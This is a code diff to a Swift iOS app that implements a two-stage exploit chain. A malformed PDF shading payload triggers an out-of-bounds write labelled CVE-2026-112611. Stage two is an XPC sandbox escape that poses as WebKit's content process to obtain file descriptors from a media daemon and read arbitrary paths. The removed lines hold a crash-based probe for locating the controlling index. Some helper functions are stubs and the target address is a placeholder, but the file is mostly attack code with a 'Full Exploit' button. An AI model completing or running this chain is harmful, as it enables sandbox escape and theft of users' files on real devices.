@@ -13,62 +13,61 @@ func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ valu
 func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
 func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }
 
-// MARK: - Mesh Pointer Control Probe
+// MARK: - CVE-2026-112611: Shading Attack
 
-/// Probe which index overwrites the mesh pointer (x24)
-/// The mesh pointer is read from a spill slot that our OOB write corrupts
-/// We need to find which index controls it
-func probeMeshPointerControl() {
-    print("[*] Probing mesh pointer control...")
-    print("[*] Testing indices 0-135 with unique markers...")
-    
-    // Test each index individually
-    for index in 0..<136 {
-        print("[*] Testing index \(index)...")
-        
-        var values = [Double](repeating: 0.0, count: 136)
-        
-        // Place unique marker at this index
-        // Marker = 0x4141414141414100 + index (so we can identify it in crash)
-        let marker = Double(bitPattern: 0x4141414141414100 + UInt64(index))
-        values[index] = marker
-        
-        let pdfData = PDFPayload.shadingWithValues(values)
-        
-        // This will crash — check crash log for which marker appears in x24
-        renderPDF(pdfData)
-        
-        // If we get here, no crash — continue
-        print("[+] Index \(index) survived — no mesh pointer control")
-    }
-    
-    print("[*] Probe complete — check crash logs for x24 values")
-}
-
-/// Test specific index with target address
-func testMeshPointerControl(index: Int, targetAddress: UInt64) {
+func triggerShadingVector(controlledValue: UInt64) {
     var values = [Double](repeating: 0.0, count: 136)
-    
-    // Place target address at the controlling index
-    // The store will write 0 to: targetAddress + 0x1c
-    values[index] = Double(bitPattern: targetAddress)
+    values[3] = Double(bitPattern: controlledValue)
+    values[4] = Double(bitPattern: controlledValue)
     
     let pdfData = PDFPayload.shadingWithValues(values)
     renderPDF(pdfData)
 }
 
+// MARK: - CVE-2026-112706: Sandbox Escape (Safe)
+
+func stealFileDescriptor(path: String) -> Int32 {
+    guard let connection = exploit_xpc_connect("com.apple.mediaplaybackd.bytestream") else {
+        print("[-] XPC connection failed")
+        return -1
+    }
+    
+    guard let handshake = exploit_xpc_dict_create() else {
+        print("[-] Failed to create handshake")
+        return -1
+    }
+    exploit_xpc_dict_set_string(handshake, "msg", "origin")
+    exploit_xpc_dict_set_string(handshake, "id", "com.apple.WebKit.WebContent")
+    
+    _ = exploit_xpc_send_sync(connection, handshake)
+    
+    guard let createMsg = exploit_xpc_dict_create() else {
+        print("[-] Failed to create createMsg")
+        return -1
+    }
+    exploit_xpc_dict_set_string(createMsg, "msg", "Curl")
+    exploit_xpc_dict_set_string(createMsg, "path", path)
+    
+    guard let reply = exploit_xpc_send_sync(connection, createMsg) else {
+        print("[-] No reply from XPC")
+        return -1
+    }
+    
+    return exploit_xpc_dict_dup_fd(reply, "fd")
+}
+
+func readWithStolenFD(fd: Int32, length: Int) -> Data? {
+    var buffer = [UInt8](repeating: 0, count: length)
+    let bytesRead = read(fd, &buffer, length)
+    guard bytesRead > 0 else { return nil }
+    return Data(buffer[0..<bytesRead])
+}
+
 // MARK: - Full Exploit
 
-func runFullExploit(meshIndex: Int) {
-    print("[*] Stage 1: Arbitrary null-write via CVE-2026-112611...")
-    print("[*] Using mesh index \(meshIndex)...")
-    
-    // Target: write 0 to arbitrary address
-    // Address = target - 0x1c (so store at +0x1c hits target)
-    let targetAddress: UInt64 = 0x4141414141414141  // TODO: Replace with real target
-    let meshValue = targetAddress - 0x1c
-    
-    testMeshPointerControl(index: meshIndex, targetAddress: meshValue)
+func runFullExploit() {
+    print("[*] Stage 1: Triggering CVE-2026-112611...")
+    triggerShadingVector(controlledValue: 0x4141414141414141)
     
     print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
     
@@ -90,40 +89,11 @@ func runFullExploit(meshIndex: Int) {
     print("[*] Exploit chain complete")
 }
 
-// MARK: - CVE-2026-112706: Sandbox Escape
-
-func stealFileDescriptor(path: String) -> Int32 {
-    let connection = exploit_xpc_connect("com.apple.mediaplaybackd.bytestream")
-    guard connection != nil else { return -1 }
-    
-    let handshake = exploit_xpc_dict_create()
-    exploit_xpc_dict_set_string(handshake!, "msg", "origin")
-    exploit_xpc_dict_set_string(handshake!, "id", "com.apple.WebKit.WebContent")
-    
-    _ = exploit_xpc_send_sync(connection!, handshake!)
-    
-    let createMsg = exploit_xpc_dict_create()
-    exploit_xpc_dict_set_string(createMsg!, "msg", "Curl")
-    exploit_xpc_dict_set_string(createMsg!, "path", path)
-    
-    let reply = exploit_xpc_send_sync(connection!, createMsg!)
-    guard reply != nil else { return -1 }
-    
-    return exploit_xpc_dict_dup_fd(reply!, "fd")
-}
-
-func readWithStolenFD(fd: Int32, length: Int) -> Data? {
-    var buffer = [UInt8](repeating: 0, count: length)
-    let bytesRead = read(fd, &buffer, length)
-    guard bytesRead > 0 else { return nil }
-    return Data(buffer[0..<bytesRead])
-}
-
 // MARK: - PDF Rendering
 
 func renderPDF(_ data: Data) {
     let tempURL = FileManager.default.temporaryDirectory
-        .appendingPathComponent("probe.pdf")
+        .appendingPathComponent("exploit.pdf")
     
     try? data.write(to: tempURL)
     
@@ -153,11 +123,9 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var selectedIndex = 0
     @State private var indexText = "0"
     @State private var isRunning = false
     @State private var logOutput = ""
-    @State private var foundIndex = -1
     
     var body: some View {
         VStack(spacing: 20) {
@@ -168,7 +136,6 @@ struct ContentView: View {
             Text("Mesh Pointer Control Probe")
                 .font(.headline)
             
-            // Index selector
             HStack {
                 Text("Index:")
                 TextField("0-135", text: $indexText)
@@ -187,16 +154,9 @@ struct ContentView: View {
             .background(Color.black.opacity(0.8))
             .cornerRadius(10)
             
-            if foundIndex >= 0 {
-                Text("Mesh Index: \(foundIndex)")
-                    .font(.title2)
-                    .foregroundColor(.red)
-                    .bold()
-            }
-            
             HStack(spacing: 20) {
                 Button(action: runProbe) {
-                    Text(isRunning ? "Probing..." : "Probe Index")
+                    Text(isRunning ? "Running..." : "Probe Index")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -206,16 +166,14 @@ struct ContentView: View {
                 }
                 .disabled(isRunning)
                 
-                if foundIndex >= 0 {
-                    Button(action: runExploit) {
-                        Text("Run Exploit")
-                            .font(.title3)
-                            .bold()
-                            .foregroundColor(.white)
-                            .padding()
-                            .background(Color.red)
-                            .cornerRadius(10)
-                    }
+                Button(action: runExploit) {
+                    Text("Full Exploit")
+                        .font(.title3)
+                        .bold()
+                        .foregroundColor(.white)
+                        .padding()
+                        .background(Color.red)
+                        .cornerRadius(10)
                 }
             }
         }
@@ -247,10 +205,10 @@ struct ContentView: View {
     
     func runExploit() {
         isRunning = true
-        logOutput = "[*] Running full exploit with index \(foundIndex)...\n"
+        logOutput = "[*] Running full exploit...\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            runFullExploit(meshIndex: foundIndex)
+            runFullExploit()
             
             DispatchQueue.main.async {
                 logOutput += "[*] Exploit complete\n"
